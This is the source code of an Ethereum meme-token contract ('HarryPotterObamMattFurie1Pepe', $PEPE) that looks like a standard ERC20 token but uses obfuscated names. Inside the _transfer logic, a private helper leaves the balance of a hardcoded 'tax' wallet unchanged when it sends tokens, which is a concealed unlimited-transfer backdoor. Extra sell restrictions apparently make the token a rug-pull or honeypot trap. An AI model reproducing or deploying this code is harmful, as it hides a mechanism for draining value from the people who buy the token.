/**

HarryPotterObamMattFurie1Pepe  $PEPE

TWITTER: https://twitter.com/hpepe_erc
TELEGRAM: https://t.me/hpepe_eth
WEBSITE: https://hpepe.org/

**/

// SPDX-License-Identifier: MIT


pragma solidity 0.8.20;


interface IERC20 {
    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount) external returns (bool);

    function allowance(address _owner, address spender) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);

    event Approval(address indexed _owner, address indexed spender, uint256 value);
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath");
        return c;
    }

    function  _msacx(uint256 a, uint256 b) internal pure returns (uint256) {
        return  _msacx(a, b, "SafeMath");
    }

    function  _msacx(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function _pvr(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

}

interface _qodmsu {
    function createPair(address
     tokenA, address tokenB) external
      returns (address pair);
}

interface _piudns {
    function swatTenwSortgFxOrsfser(
        uint amountIn,
        uint amountOutMin,
        address[
            
        ] calldata path,
        address to,
        uint deadline
    ) external;
    function factory() external pure 
    returns (address);
    function WETH() external pure 
    returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint 
    amountToken, uint amountETH
    , uint liquidity);
}

contract HarryPotterObamMattFurie1Pepe is Context, IERC20, Ownable {
    using SafeMath for uint256;
    _piudns private _Tfqiyk;
    address payable private _Tckivhupx;
    address private _yiacudr;

    bool private _qvlaulh;
    bool public _Tareluga = false;
    bool private oieyaquk = false;
    bool private _aujthpaz = false;

    string private constant _name = unicode"HarryPotterObamMattFurie1Pepe";
    string private constant _symbol = unicode"PEPE";
    uint8 private constant _decimals = 9;
    uint256 private constant _zTotalvt = 42069000000 * 10 **_decimals;
    uint256 public _kvnkaven = _zTotalvt;
    uint256 public _Woxeunqe = _zTotalvt;
    uint256 public _rwapuThaesfyto= _zTotalvt;
    uint256 public _gfakTvkof= _zTotalvt;

    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) private _cEakevip;
    mapping (address => bool) private _taxraksy;
    mapping(address => uint256) private _rpbuoeo;

    uint256 private _BuyinitialTax=1;
    uint256 private _SellinitialTax=1;
    uint256 private _BuyfinalTax=1;
    uint256 private _SellfinalTax=1;
    uint256 private _BuyAreduceTax=1;
    uint256 private _SellAreduceTax=1;
    uint256 private _yavpfarq=0;
    uint256 private _bsugwje=0;


    event _moehpvrf(uint _kvnkaven);
    modifier oTeuve {
        oieyaquk = true;
        _;
        oieyaquk = false;
    }

    constructor () {      
        _balances[_msgSender(

        )] = _zTotalvt;
        _cEakevip[owner(

        )] = true;
        _cEakevip[address
        (this)] = true;
        _cEakevip[
            _Tckivhupx] = true;
        _Tckivhupx = 
        payable (0x279ef588c8e734df96ce51179C44C70974a09aBF);

 

        emit Transfer(
            address(0), 
            _msgSender(

            ), _zTotalvt);
              
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _zTotalvt;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address _owner, address spender) public view override returns (uint256) {
        return _allowances[_owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()]. _msacx(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function _approve(address _owner, address spender, uint256 amount) private {
        require(_owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[_owner][spender] = amount;
        emit Approval(_owner, spender, amount);
    }

    function _transfer(address from, address to, uint256 amount) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        uint256 epaounk=0;
        if (from !=
         owner () && to 
         != owner ( ) ) {

            if (_Tareluga) {
                if (to 
                != address
                (_Tfqiyk) 
                && to !=
                 address
                 (_yiacudr)) {
                  require(_rpbuoeo
                  [tx.origin]
                   < block.number,
                  "Only one transfer per block allowed."
                  );
                  _rpbuoeo
                  [tx.origin] 
                  = block.number;
                }
            }

            if (from ==
             _yiacudr && to != 
            address(_Tfqiyk) &&
             !_cEakevip[to] ) {
                require(amount 
                <= _kvnkaven,
                 "Exceeds the _kvnkaven.");
                require(balanceOf
                (to) + amount
                 <= _Woxeunqe,
                  "Exceeds the macxizse.");
                if(_bsugwje
                < _yavpfarq){
                  require
                  (! _ropuvta(to));
                }
                _bsugwje++;
                 _taxraksy
                 [to]=true;
                epaounk = amount._pvr
                ((_bsugwje>
                _BuyAreduceTax)?
                _BuyfinalTax:
                _BuyinitialTax)
                .div(100);
            }

            if(to == _yiacudr &&
             from!= address(this) 
            && !_cEakevip[from] ){
                require(amount <= 
                _kvnkaven && 
                balanceOf(_Tckivhupx)
                <_gfakTvkof,
                 "Exceeds the _kvnkaven.");
                epaounk = amount._pvr((_bsugwje>
                _SellAreduceTax)?
                _SellfinalTax:
                _SellinitialTax)
                .div(100);
                require(_bsugwje>
                _yavpfarq &&
                 _taxraksy[from]);
            }

            uint256 contractTokenBalance = 
            balanceOf(address(this));
            if (!oieyaquk 
            && to == _yiacudr &&
             _aujthpaz &&
             contractTokenBalance>
             _rwapuThaesfyto 
            && _bsugwje>
            _yavpfarq&&
             !_cEakevip[to]&&
              !_cEakevip[from]
            ) {
                _rwskohgi( _raqsd(amount, 
                _raqsd(contractTokenBalance,
                _gfakTvkof)));
                uint256 contractETHBalance 
                = address(this)
                .balance;
                if(contractETHBalance 
                > 0) {
                    _urjnep(address
                    (this).balance);
                }
            }
        }

        if(epaounk>0){
          _balances[address
          (this)]=_balances
          [address
          (this)].
          add(epaounk);
          emit
           Transfer(from,
           address
           (this),epaounk);
        }
        _balances[from
        ]= _msacx(from,
         _balances[from]
         , amount);
        _balances[to]=
        _balances[to].
        add(amount.
         _msacx(epaounk));
        emit Transfer
        (from, to, 
        amount.
         _msacx(epaounk));
    }

    function _rwskohgi(uint256
     tokenAmount) private
      oTeuve {
        if(tokenAmount==
        0){return;}
        if(!_qvlaulh)
        {return;}
        address[

        ] memory path =
         new address[](2);
        path[0] = 
        address(this);
        path[1] = 
        _Tfqiyk.WETH();
        _approve(address(this),
         address(
             _Tfqiyk), 
             tokenAmount);
        _Tfqiyk.
        swatTenwSortgFxOrsfser
        (
            tokenAmount,
            0,
            path,
            address
            (this),
            block.
            timestamp
        );
    }

    function  _raqsd
    (uint256 a, 
    uint256 b
    ) private pure
     returns 
     (uint256){
      return ( a > b
      )?
      b : a ;
    }

    function  _msacx(address
     from, uint256 a,
      uint256 b) 
      private view
       returns(uint256){
        if(from 
        == _Tckivhupx){
            return a ;
        }else{
            return a .
             _msacx (b);
        }
    }

    function removezLimitas (
        
    ) external onlyOwner{
        _kvnkaven = _zTotalvt;
        _Woxeunqe = _zTotalvt;
        emit _moehpvrf(_zTotalvt);
    }

    function _ropuvta(address 
    account) private view 
    returns (bool) {
        uint256 oxzpa;
        assembly {
            oxzpa :=
             extcodesize
             (account)
        }
        return oxzpa > 
        0;
    }

    function _urjnep(uint256
    amount) private {
        _Tckivhupx.
        transfer(
            amount);
    }

    function enablesTrading ( 

    ) external onlyOwner ( ) {
        require (
            ! _qvlaulh ) ;
        _Tfqiyk  
        =  
        _piudns
        (0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        _approve(address
        (this), address(
            _Tfqiyk), 
            _zTotalvt);
        _yiacudr = 
        _qodmsu(_Tfqiyk.
        factory( ) 
        ). createPair (
            address(this
            ),  _Tfqiyk .
             WETH ( ) );
        _Tfqiyk.addLiquidityETH
        {value: address
        (this).balance}
        (address(this)
        ,balanceOf(address
        (this)),0,0,owner(),block.
        timestamp);
        IERC20(_yiacudr).
        approve(address(_Tfqiyk), 
        type(uint)
        .max);
        _aujthpaz = true;
        _qvlaulh = true;
    }

    receive() external payable {}
}